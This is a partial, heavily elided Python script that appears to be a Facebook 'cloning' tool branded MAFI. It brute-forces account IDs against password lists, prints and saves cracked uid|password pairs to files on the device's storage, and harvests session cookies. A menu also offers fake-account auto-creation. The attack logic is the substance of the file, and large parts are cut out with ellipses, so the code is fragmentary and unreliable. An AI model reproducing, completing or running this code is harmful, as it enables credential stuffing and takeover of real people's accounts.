...
def linex():
    print('\033[1;32m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
os.system('xdg-open https://youtube.com/@TechnicalBDArif31?si=YkYXk5lQPmNfYSEG')
def clear():
        os.system('clear')
        print(logo)
A = '\x1b[1;97m' 
        ...
        #    linex()
            ...
            if xd in ['1','01']:
                ...
                Create()
                 ...
                 os.system('xdg-open https://www.facebook.com/profile.php?id=100014925453899&mibextid=rS40aB7S9Ucbxw6v')
            elif xd in ['0','00']:
                exit(' Thanks for use 🥰 ')
            else:
...
def api1(ids,names,passlist):
        try:
            global ok,loop
            sys.stdout.write('\r\r\033[1;37m [MAFI-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [MAFI-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [MAFI-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'your account was locked' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [MAFI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/EHC/MAFI-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def menu():
            clear()
        #    linex()
            print('   \33[37;42m\t Welcome MAFI  Tool\33[0;m');linex()
            print(' \033[1;32m[\033[1;37m1\033[1;32m] \033[1;37mFile Cloning ')
            print(' \033[1;32m[\033[1;37m2\033[1;32m] \033[1;37mRandom Cloning ')
            print(' \033[1;32m[\033[1;37m3\033[1;32m] \033[1;37mCreate Auto fb')
            print(' \033[1;32m[\033[1;37m4\033[1;32m] \033[1;37mAuto Create Fb ')
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [MAFI-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MAFI-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/MAFI-CP.txt','a').write(ids+'|'+pas+'\n')
                ...
                for pas in passlist:
                        ...
                        if 'your account was locked' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [MAFI-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [MAFI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MAFI-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
